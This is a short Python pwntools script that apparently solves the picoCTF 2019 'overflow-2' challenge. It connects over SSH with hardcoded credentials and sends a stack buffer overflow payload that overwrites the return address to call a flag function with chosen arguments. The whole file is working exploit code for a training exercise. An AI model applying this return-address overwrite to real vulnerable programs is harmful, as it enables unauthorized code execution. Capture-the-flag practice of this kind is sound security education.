from pwn import *

session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)

addressOfFlagFxn = '\xe6\x85\x04\x08'
arg1 = '\xEF\xBE\xAD\xDE'
arg2 = '\x0D\xD0\xDE\xC0'

payload = 'a' * 176 + 'b' * 12 + addressOfFlagFxn + 'c' * 4 + arg1 + arg2

program = session.process(['./vuln'], cwd='/problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e')

program.sendlineafter("Please enter your string: \n", payload)

program.recvline()

flagInB = program.recv()

flag = flagInB.decode('ascii')
rawFlag = flag[flag.index('{')+1:flag.index('}')]

print(rawFlag)
